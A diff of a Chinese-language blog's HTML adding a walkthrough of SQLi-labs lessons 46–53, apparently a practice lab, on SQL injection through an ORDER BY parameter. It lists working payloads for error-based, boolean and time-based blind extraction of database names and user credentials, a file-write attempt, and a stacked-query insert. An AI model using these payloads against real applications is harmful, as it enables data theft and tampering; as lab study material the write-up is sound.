@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: pwn | Welcome to my blogs!</title>
+  <title>less46-53 | Welcome to my blogs!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Welcome to my blogs!">
-<meta property="og:url" content="http://yoursite.com/tags/pwn/index.html">
+  <meta name="description" content="Less-46">
+<meta property="og:type" content="article">
+<meta property="og:title" content="less46-53">
+<meta property="og:url" content="http://yoursite.com/2020/11/02/less46-50/index.html">
 <meta property="og:site_name" content="Welcome to my blogs!">
+<meta property="og:description" content="Less-46">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-11-02T14:35:11.709Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Welcome to my blogs!">
+<meta name="twitter:title" content="less46-53">
+<meta name="twitter:description" content="Less-46">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to my blogs!" type="application/atom+xml">
   
@@ -150,113 +154,283 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-less46-50" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/03/level5/" class="archive-article-date">
-  	<time datetime="2019-10-03T09:02:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-03</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/03/level5/">level5</a>
+    <h1 class="article-title" itemprop="name">
+      less46-53
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">libc泄露</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/01/pwn-hello/" class="archive-article-date">
-  	<time datetime="2019-10-01T08:50:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-01</time>
+        
+        <a href="/2020/11/02/less46-50/" class="archive-article-date">
+  	<time datetime="2020-11-02T14:16:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-02</time>
 </a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3>Less-46</h3>
+<a id="more"></a>
+<p>
+请求方式    注入类型            拼接方式
+GET    报错、布尔盲注、延时盲注    ORDER BY $id
+</p>
+<p>先看关键源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># GET 方式获取 sort 参数</span><br><span class="line">$id=$_GET[&apos;sort&apos;];</span><br><span class="line"></span><br><span class="line"># 直接将 id 带入 SQL 中</span><br><span class="line">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br><span class="line"></span><br><span class="line">if 查询成功：</span><br><span class="line">    输出查询信息</span><br><span class="line">else：</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>
+其实看完源码知道它的原理，就可以用注入姿势上
+验证方式</p>
+
+<h4>升序和降序验证</h4>
+<p>
+Bash
+# 升序排序
+?sort=1 asc
+
+</p><h1 id="降序排序"><a href="#降序排序" class="headerlink" title="降序排序"></a>降序排序</h1><p>?sort=1 dasc<br>rand() 验证<br>rand(ture) 和 rand(false) 的结果是不一样的</p>
+<p>Payload<br>?sort=rand(true)<br>?sort=rand(false)<br>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p>
+<p>此外 rand() 结果是一直都是随机的</p>
+<p>?sort=rand()<br>?sort=1 and rand()</p>
+<p></p>
+<p>
+</p><h4>延时验证</h4>
+Payload
+?sort=sleep(1)
+?sort=(sleep(1))
+?sort=1 and sleep(1)
+这种方式均可以延时，延时的时间为 (行数*1) 秒
+<p></p>
+
+<h4>报错注入1</h4>
+<p>
+Payload
+http://192.168.248.133/sql/Less-46/?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
+</p>
+
+<h4>报错注入2</h4>
+<p>
+利用 procedure analyse 参数，也可以执行报错注入。
+
+</p><p>Payload<br>?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)<br>?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(‘:’,username,password)+FROM+users limit 0,1))),1)</p>
+<p></p>
+
+<h4>布尔盲注</h4>
+<p>
+数据库第 1 位为：s
+
+</p><p>Payload<br>?sort=rand(left(database(),1)&gt;’r’)<br>?sort=rand(left(database(),1)&gt;’s’)</p>
+<p></p>
+<h4>延时盲注</h4>
+<p>
+数据库第一个字母的 ascii 码为 115，即s
+</p><p>
+Payload
+?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))
+?sort=rand(if(ascii(substr(database(),1,1))>115,1,sleep(1)))
+
+</p><p>用into outfile将查询结果导入到文件<br>?sort=1 into outfile “/var/www/html/less46.txt”<br>失败<br>国光说，web目前mysql没有读写权限造成的</p>
+<p></p>
+<h3>Less-47</h3>
+<p>
+请求方式        注入类型                拼接方式
+GET        报错、布尔盲注、延时盲注        ORDER BY '$id'
+和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。
+</p>
+<h3>Less-48</h3>
+<p>
+请求方式        注入类型            拼接方式
+GET        布尔盲注、延时盲注        ORDER BY $id
+和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。
+</p>
+<h3>Less-49</h3>
+<p>
+请求方式        注入类型            拼接方式
+GET        布尔盲注、延时盲注        ORDER BY '$id'
+</p>
+<p>
+和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。
+</p>
+<h3>less-50</h3>
+<p>
+跟less46一样的拼接
+报错注入
+http://192.168.248.133/sql/Less-50/?sort=1 and updatexml(1,concat(0x7e,(database()),0x7e),1)
+
+</p><p>因为源码中有mysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。<br>这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
+<p></p>
+<p>
+堆叠注入
+?sort=1;insert into users(username,password) values ('less50','less50');
+</p>
+<p>
+Boolean
+?sort=1 and if(left(database(),1)='s');
+</p>
+
+<h3>Less-51</h3>
+<p>
+请求方式        注入类型                                    拼接方式
+GET                报错、布尔盲注、延时盲注、堆叠注入        ORDER BY '$id'
+
+</p><p>?sort=1’ –+</p>
+<p></p>
+<h3>less-52</h3>
+<p>
+通过对比源码
+在less-51中有print_r(mysqli_error($con1));
+但是在less-52无
+所以没有报错注入这东西
+其它和less51一样
+</p>
+<h3>Less-53</h3>
+<p>
+请求方式        注入类型                            拼接方式
+GET                布尔盲注、延时盲注、堆叠注入        ORDER BY '$id'
+和 Less-51 是一样的，只是少了报错注入的利用方式。
+</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>十分感谢<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/01/pwn-hello/">pwn hello</a>
-    </h1>
-  
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PWN//" class="article-tag-list-link color4">PWN</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/11/02/less46-50/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/11/02/less54-65/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          less54-65
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2020/10/31/记一次ssrf漏洞gopher对mysql的攻击/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">记一次ssrf漏洞gopher对mysql的攻击</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -287,9 +461,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
